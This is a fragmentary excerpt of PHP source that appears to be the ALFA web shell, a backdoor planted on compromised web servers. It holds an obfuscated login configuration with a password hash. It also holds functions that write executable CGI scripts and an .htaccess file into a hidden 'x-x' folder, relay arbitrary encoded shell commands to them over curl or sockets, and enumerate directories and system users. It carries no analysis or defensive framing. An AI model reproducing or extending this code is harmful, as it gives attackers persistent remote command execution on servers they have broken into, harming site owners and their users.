...
$GLOBALS['NeUSMyPGXP'] = array(
	'usmfzmlHFCje' => 'apc',//login username
	'paLDRhHfAovu' => 'b5a0edfab0b6c4d1dfbd2e70ddf5c09c',
...
function _alfa_cgicmd($cmd,$lang="perl"){
	...
	if($is_curl||$is_socket){
		...
		if(isset($_SESSION["x-x"])){
			if(!@file_exists("x-x/".$_SESSION["x-x"].".alfa")){
				$recreate = true;
				$lang = $_SESSION["x-x"];
			}
		}
		if(!isset($_SESSION["x-x"])||$recreate){
			...
			alfacgihtaccess('cgi', "x-x/");
		}else{
			$lang = $_SESSION["x-x"];
		}
		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
		if($is_curl){
			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/x-x/".$lang.".alfa";
			$post = new AlfaCURL();
			$data = $post->Send($address, "post", $cmd);
		}elseif($is_socket){
			$server = $_SERVER["SERVER_NAME"];
			$uri = dirname($_SERVER["REQUEST_URI"])."/x-x/".$lang.".alfa";
...
function alfaWriteTocgiapi($name, $source){
	@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
	@mkdir('x-x',0755);
	__write_file("x-x/".$name, __get_resource($source));
	@chmod("x-x/".$name, 0755);
}
...
function alfaupdateheader(){
	if(!isset($_SESSION["updateheader_data"])){
		...
		$data = alfaEx("cd '{$realdir}/x-x';sh getheader.alfa",false,true,true);
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_SESSION["alfachdir_bash"])||@!file_exists("x-x/getdir.alfa")){
		...
		$dirContent = alfaEx("cd x-x;sh getdir.alfa '".addslashes($_SESSION[__LAST_CWD__])."'");
...
$bash_users  = alfaEx("cd x-x;sh basedir.alfa ".$makepwd,false,true,true);
